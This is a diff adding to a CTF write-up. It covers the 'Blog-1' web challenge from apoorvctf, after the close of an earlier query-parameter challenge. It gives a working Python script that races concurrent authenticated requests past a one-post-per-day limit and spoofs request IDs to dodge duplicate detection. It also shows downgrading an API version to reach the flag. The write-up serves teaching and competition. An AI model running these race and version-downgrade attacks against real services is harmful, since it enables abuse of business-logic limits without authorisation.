@@ -49,4 +49,104 @@ then we can deduce that we must pass the parameter **flag** and as value **yes**
 `/goofyahhroute?flag=yes`
 and obtain the flag: `apoorvctf{s30_1snT_0pt1onaL}`
 
+2. By `x.two`
 
+# Blog-1 - Web
+
+### Description
+
+In the digital realm, Blog-1 awaited brave developers. The mission? Craft a captivating blog with enchanting posts, lively comments, and secure user authentication. Create a functional and visually stunning masterpiece. Ready for the Blog-1 adventure?
+
+
+### Solution
+
+We have basic web page where we can register user and login with it. Exploring menu items, we have option of `Daily Rewards`
+
+![Claim](./images/claim.png)
+
+
+We can see that we have to write 5 blogs to claim the reward (which is probably our flag). But when we try to write 2 blogs, it tells us that we can only write one blog per day. This suggests that there might be a race condition vulnerability, where we can send multiple concurrent requests.
+
+I used this script to write multiple blogs at once:
+
+
+```python
+import requests
+import threading
+import time
+import uuid
+
+SUCCESS_COUNT = 0
+SUCCESS_LOCK = threading.Lock()
+BARRIER = threading.Barrier(5)  # Strict synchronization for 5 warriors
+
+def domain_expansion(session):
+    global SUCCESS_COUNT
+    try:
+        # Wait for all threads to reach this point
+        BARRIER.wait()
+        
+        url = "http://chals1.apoorvctf.xyz:5001/api/v1/blog/addBlog"
+        headers = {
+            "authorization": "Bearer [token]",
+            "Content-Type": "application/json",
+            "X-Request-ID": str(uuid.uuid4())  # Bypass duplicate request detection
+        }
+        
+        payload = {
+            "title": f"Limitless Void {uuid.uuid4().hex[:6]}",  # Unique title each request
+            "description": "Cursed Technique: Maximum Output",
+            "content": "Domain Expansion: Infinite Void"
+        }
+
+        # Surgical strike with precise timing
+        response = session.post(
+            url,
+            headers=headers,
+            json=payload,
+            timeout=15  # Extended timeout for server processing
+        )
+
+        if response.status_code == 201:
+            with SUCCESS_LOCK:
+                SUCCESS_COUNT += 1
+                print(f"Domain expanded! Success #{SUCCESS_COUNT}")
+        else:
+            print(f"Blocked: {response.status_code} | {response.text}")
+
+    except Exception as e:
+        print(f"Curse energy leak: {str(e)}")
+
+if __name__ == "__main__":
+    # Create 5 dedicated cursed techniques
+    sessions = [requests.Session() for _ in range(5)]
+    
+    threads = []
+    for i in range(5):
+        t = threading.Thread(target=domain_expansion, args=(sessions[i],))
+        threads.append(t)
+        t.start()
+        time.sleep(0.001)  # Nanosecond-level stagger
+    
+    # Wait for all techniques to complete
+    for t in threads:
+        t.join()
+    
+    print(f"\nTotal successful domain expansions: {SUCCESS_COUNT}")
+    print("If <5, repeat until the barrier breaks!")
+```
+
+
+And we successfully wrote 5 blogs. Visiting `Daily Reward` option sends request to `/api/v2/gift` endpoint which contains this:
+
+![claim2](./images/claim2.png)
+
+
+This links to a troll youtube video:
+
+https://youtu.be/WePNs-G7puA?si=DOUFW9vAgUKdClxX
+
+
+But changing the endpoint back to `/api/v1/gift` gives us our flag:
+
+apoorvctf{s1gm@_s1gm@_b0y}
